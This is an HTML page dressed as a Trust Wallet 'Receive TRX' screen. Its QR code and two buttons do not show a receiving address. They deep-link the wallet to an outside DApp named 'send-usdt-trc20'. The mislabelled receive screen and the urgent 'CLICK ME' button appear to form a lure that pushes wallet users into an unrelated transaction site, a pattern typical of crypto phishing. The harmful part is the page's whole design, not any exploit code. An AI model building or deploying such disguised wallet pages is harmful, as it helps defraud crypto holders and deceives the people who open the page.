
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Open in Trust Wallet</title>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont,
        'Segoe UI', Roboto, sans-serif;
      background: #0a0e17;
      color: #e5e7eb;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      max-width: 400px;
      width: 100%;
      padding: 20px;
    }

    .header {
      display: flex;
      align-items: center;
      gap: 12px;
      padding: 16px 0 24px;
    }

    .back-btn {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      background: #1a1f2e;
      border: 1px solid #1f2937;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
    }

    .header-title {
      font-size: 18px;
      font-weight: 600;
      flex: 1;
      text-align: center;
    }

    .warning {
      background: rgba(251,191,36,0.1);
      border: 1px solid rgba(251,191,36,0.3);
      border-radius: 12px;
      padding: 12px 16px;
      margin-bottom: 25px;
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 13px;
      color: #fbbf24;
    }

    .warning-icon {
      width: 28px;
      height: 28px;
      border-radius: 50%;
      background: rgba(251,191,36,0.2);
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
    }

    .qr-wrapper {
      display: flex;
      justify-content: center;
      margin-bottom: 25px;
    }

    .qr-box {
      background: white;
      border-radius: 16px;
      padding: 16px;
      position: relative;
    }

    .qr-center {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 48px;
      height: 48px;
      background: white;
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    .qr-center img {
      width: 36px;
      height: 36px;
      object-fit: contain;
    }

    .section-label {
      font-size: 15px;
      font-weight: 600;
      margin-bottom: 12px;
      text-align: center;
    }

    /* Main Click Me button */
    .open-wallet-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      width: 100%;
      padding: 17px;
      margin-bottom: 14px;
      border: none;
      border-radius: 14px;
      background: linear-gradient(135deg, #3375bb, #1b4f91);
      color: white;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 5px 20px rgba(51,117,187,0.25);
      transition: transform 0.15s, opacity 0.15s;
    }

    .open-wallet-btn:hover {
      opacity: 0.92;
    }

    .open-wallet-btn:active {
      transform: scale(0.98);
    }

    .deposit-btn {
      display: flex;
      align-items: center;
      gap: 14px;
      background: #1a1f2e;
      border: 1px solid #1f2937;
      border-radius: 14px;
      padding: 16px;
      cursor: pointer;
      width: 100%;
      color: #e5e7eb;
      font-size: 15px;
      font-weight: 500;
    }

    .deposit-icon {
      width: 36px;
      height: 36px;
      border-radius: 50%;
      background: #f0b90b;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .deposit-arrow {
      margin-left: auto;
      color: #6b7280;
    }

    .help-text {
      text-align: center;
      color: #9ca3af;
      font-size: 12px;
      line-height: 1.5;
      margin-top: 15px;
    }

    #qrcode canvas {
      display: block;
    }
  </style>
</head>

<body>
  <div class="container">

    <div class="header">
      <div class="back-btn" onclick="history.back()">
        <svg width="20" height="20" viewBox="0 0 24 24"
          fill="none" stroke="white" stroke-width="2">
          <path d="M15 18l-6-6 6-6"/>
        </svg>
      </div>
      <div class="header-title">Receive TRX</div>
      <div style="width:40px"></div>
    </div>

    <div class="warning">
      <div class="warning-icon">!</div>
      <div>
        Only send TRX on the Tron network to the correct
        receiving address. Sending unsupported assets may
        result in permanent loss.
      </div>
    </div>

    <div class="qr-wrapper">
      <div class="qr-box">
        <div id="qrcode"></div>
        <div class="qr-center">
          <img
            src="https://zengo.com/wp-content/uploads/Tron.png"
            alt="Tron"
          />
        </div>
      </div>
    </div>

    <div class="section-label">Open in Trust Wallet</div>

    <!-- Click Me button -->
    <button
      class="open-wallet-btn"
      type="button"
      onclick="openInTrustWallet()"
    >
      <svg width="22" height="22" viewBox="0 0 24 24"
        fill="none" stroke="currentColor" stroke-width="2">
        <path d="M14 3h7v7"/>
        <path d="M10 14L21 3"/>
        <path d="M21 14v6a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h6"/>
      </svg>
      CLICK ME — OPEN TRUST WALLET
    </button>

    <button
      class="deposit-btn"
      type="button"
      onclick="openInTrustWallet()"
    >
      <div class="deposit-icon">
        <svg width="20" height="20" viewBox="0 0 24 24"
          fill="white">
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10
          10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5
          1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
        </svg>
      </div>
      <span>Open </span>
      <span class="deposit-arrow">›</span>
    </button>

    <p class="help-text">
      Tap the button to open your DApp through Trust Wallet.
      If Trust Wallet is not installed, install it and try again.
    </p>

  </div>

  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>

  <script>
    // Your hosted DApp URL
    const DAPP_URL = 'https://send-usdt-trc20.vercel.app/';

    // Trust Wallet deep link
    const TRUST_WALLET_URL =
      'https://link.trustwallet.com/open_url?coin_id=195&url='
      + encodeURIComponent(DAPP_URL);

    // Generate QR code
    window.addEventListener('load', function () {
      new QRCode(document.getElementById('qrcode'), {
        text: TRUST_WALLET_URL,
        width: 200,
        height: 200,
        colorDark: '#000000',
        colorLight: '#ffffff',
        correctLevel: QRCode.CorrectLevel.H
      });
    });

    // Open DApp through Trust Wallet
    function openInTrustWallet() {
      window.location.href = TRUST_WALLET_URL;
    }
  </script>
</body>
</html>
